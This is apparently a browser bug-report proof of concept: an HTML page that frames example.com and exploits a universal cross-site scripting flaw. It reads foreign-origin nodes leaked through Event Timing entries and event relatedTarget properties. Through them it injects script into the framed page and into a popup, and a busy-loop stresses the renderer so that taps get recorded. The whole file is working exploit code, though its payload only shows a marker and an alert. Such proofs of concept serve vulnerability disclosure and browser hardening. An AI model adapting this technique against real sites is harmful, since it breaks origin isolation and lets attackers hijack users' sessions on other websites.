@@ -1,0 +1,160 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Example.com Event Timing UXSS PoC</title>
+<style>
+  * { box-sizing: border-box; }
+  body { margin: 0; font: 16px system-ui, sans-serif; background: #101622; color: #eef4ff; }
+  header { padding: 14px 16px; background: #20345d; }
+  header strong { display: block; font-size: 19px; }
+  #instruction { display: block; margin-top: 4px; }
+  #log { margin: 0; padding: 12px 16px; height: 27vh; overflow: auto; white-space: pre-wrap; overflow-wrap: anywhere; color: #bfe0ff; }
+  iframe { display: block; width: 100%; height: 64vh; border: 4px solid #4e78c7; background: white; }
+</style>
+<header>
+  <strong>Example.com Event Timing UXSS PoC</strong>
+  <span id="instruction">Tap once inside the framed Example Domain page.</span>
+</header>
+<pre id="log"></pre>
+<iframe id="victim" name="event_timing_example_event_victim"></iframe>
+<script>
+(() => {
+  const params = new URLSearchParams(location.search);
+  const targetUrl = 'https://example.com/?event-timing=example-only';
+  const matchedControl = params.get('control') === '1'
+    || location.hash === '#control';
+  const logNode = document.querySelector('#log');
+  const seen = new WeakSet();
+  let attacked = false;
+
+  function log(message, data) {
+    const suffix = data === undefined ? '' : ' ' + JSON.stringify(data);
+    logNode.textContent += `${new Date().toISOString()} ${message}${suffix}\n`;
+    logNode.scrollTop = logNode.scrollHeight;
+  }
+
+  function attackForeignNode(node, entry) {
+    if (attacked || !node || seen.has(node)) return;
+    seen.add(node);
+
+    let owner;
+    try {
+      owner = node.ownerDocument;
+      log('TARGET_EXPOSED', {
+        entry: entry.name,
+        duration: entry.duration,
+        tag: node.nodeName,
+        sameDocument: owner === document,
+        ownerURL: owner && owner.URL
+      });
+    } catch (error) {
+      log('TARGET_WRAPPER_BLOCKED', {name: error.name, message: error.message});
+      return;
+    }
+    if (!owner || owner === document) return;
+    if (matchedControl) {
+      attacked = true;
+      log('MATCHED_CONTROL_DROPPED_FOREIGN_NODE', {ownerURL: owner.URL});
+      return;
+    }
+    attacked = true;
+
+    const payload = `(() => {
+      const foreignOrigin = location.origin;
+      const foreignUrl = location.href;
+      const popupName = 'event_timing_example_top_' + Math.random().toString(36).slice(2);
+      const popup = window.open(foreignUrl, popupName);
+      document.documentElement.setAttribute('data-event-timing-child', foreignOrigin);
+      const childMarker = document.createElement('div');
+      childMarker.id = 'PoC_by_Event_Timing_child';
+      childMarker.textContent = 'PoC_by_Event_Timing child realm: ' + foreignOrigin;
+      childMarker.style.cssText = 'position:fixed;inset:0 auto auto 0;z-index:2147483647;background:#7b1020;color:white;padding:12px;font:18px system-ui';
+      document.documentElement.append(childMarker);
+      if (!popup) return;
+      const proofSource = "document.documentElement.innerHTML='<body style=\\"font:24px system-ui;padding:32px\\"><h1 id=\\"PoC_by_Event_Timing\\">PoC_by_Event_Timing</h1><p id=\\"foreign-origin\\">'+location.origin+'</p></body>';document.title='PoC_by_Event_Timing '+location.origin;alert(location.origin)";
+      let attempts = 0;
+      const timer = setInterval(() => {
+        attempts++;
+        try {
+          if (popup.location.protocol === 'https:' && popup.location.origin === foreignOrigin) {
+            const popupDocument = popup.document;
+            const proofScript = popupDocument.createElement('script');
+            proofScript.textContent = proofSource;
+            (popupDocument.head || popupDocument.documentElement).appendChild(proofScript);
+            clearInterval(timer);
+            return;
+          }
+        } catch (_) {}
+        if (attempts > 80) clearInterval(timer);
+      }, 100);
+    })()`;
+
+    try {
+      const script = owner.createElement('script');
+      script.textContent = payload;
+      (owner.head || owner.documentElement).appendChild(script);
+      log('FOREIGN_SCRIPT_APPENDED', {ownerURL: owner.URL});
+    } catch (error) {
+      log('FOREIGN_MUTATION_BLOCKED', {name: error.name, message: error.message});
+    }
+  }
+
+  for (const type of [
+    'pointerover', 'pointerout', 'pointerenter', 'pointerleave',
+    'mouseover', 'mouseout', 'mouseenter', 'mouseleave',
+    'focusin', 'focusout'
+  ]) {
+    document.addEventListener(type, event => {
+      let related = null;
+      try { related = event.relatedTarget; } catch (error) {
+        log('RELATED_GETTER_THREW', {type, name: error.name, message: error.message});
+      }
+      log('BOUNDARY', {
+        type,
+        target: event.target && event.target.nodeName,
+        related: related && related.nodeName
+      });
+      if (related) {
+        attackForeignNode(related, {name: `${type}.relatedTarget`, duration: 0});
+      }
+    }, true);
+  }
+
+  if (!('PerformanceObserver' in window)
+      || !PerformanceObserver.supportedEntryTypes.includes('event')) {
+    log('EVENT_TIMING_UNAVAILABLE', PerformanceObserver.supportedEntryTypes);
+  } else {
+    const observer = new PerformanceObserver(list => {
+      for (const entry of list.getEntries()) {
+        let target = null;
+        try { target = entry.target; } catch (error) {
+          log('TARGET_GETTER_THREW', {name: error.name, message: error.message});
+        }
+        log('EVENT', {
+          name: entry.name,
+          duration: entry.duration,
+          target: target ? target.nodeName : null
+        });
+        if (target) attackForeignNode(target, entry);
+      }
+    });
+    observer.observe({type: 'event', buffered: true, durationThreshold: 16});
+    log('OBSERVER_ARMED', {targetUrl, matchedControl});
+  }
+
+  document.querySelector('#victim').src = targetUrl;
+
+  // Event Timing clamps duration thresholds to 16 ms. Keep the shared
+  // renderer main thread busy enough for an ordinary touch interaction to
+  // cross that threshold. This does not create or synthesize trusted input.
+  if (params.get('nostress') !== '1') {
+    const stressDeadline = performance.now() + 20000;
+    const stressFrame = () => {
+      const sliceEnd = performance.now() + 24;
+      while (performance.now() < sliceEnd) {}
+      if (performance.now() < stressDeadline) requestAnimationFrame(stressFrame);
+    };
+    requestAnimationFrame(stressFrame);
+  }
+})();
+</script>
